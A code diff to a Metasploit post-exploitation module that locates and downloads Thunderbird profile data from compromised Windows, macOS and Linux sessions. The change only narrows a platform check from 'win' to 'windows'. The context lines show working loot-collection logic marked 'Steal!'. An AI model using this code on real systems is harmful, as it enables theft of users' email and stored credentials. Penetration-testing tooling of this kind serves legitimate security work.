@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
     when /osx/
       user = session.shell_command("whoami").chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
-    when /win/
+    when /windows/
       if session.type =~ /meterpreter/
         user_profile = session.sys.config.getenv('APPDATA')
       else
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Post
     # Steal!
     profiles.each do |profile|
       next if profile =~ /^\./
-      slash = (session.platform =~ /win/) ? "\\" : "/"
+      slash = (session.platform =~ /windows/) ? "\\" : "/"
       p = base + profile + slash
 
       # Download the database, and attempt to process the content
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Post
           f.close
         end
       elsif session.type =~ /shell/
-        cmd_show = (session.platform =~ /win/) ? 'type' : 'cat'
+        cmd_show = (session.platform =~ /windows/) ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
         loot = cmd_exec(cmd_show, "\"#{p+item}\"").lstrip
@@ -210,11 +210,11 @@ class MetasploitModule < Msf::Post
         tb_profiles << subdir
       end
     else
-      cmd = (session.platform =~ /win/) ? "dir \"#{path}\"" : "ls -ld #{path}*/"
+      cmd = (session.platform =~ /windows/) ? "dir \"#{path}\"" : "ls -ld #{path}*/"
       dir = cmd_exec(cmd)
       dir.each_line do |line|
         line = line.strip
-        next if session.platform =~ /win/ and line !~ /<DIR>((.+)\.(\w+)$)/
+        next if session.platform =~ /windows/ and line !~ /<DIR>((.+)\.(\w+)$)/
         next if session.platform =~ /linux|osx/ and line !~ /(\w+\.\w+)/
         tb_profiles << $1 if not $1.nil?
       end
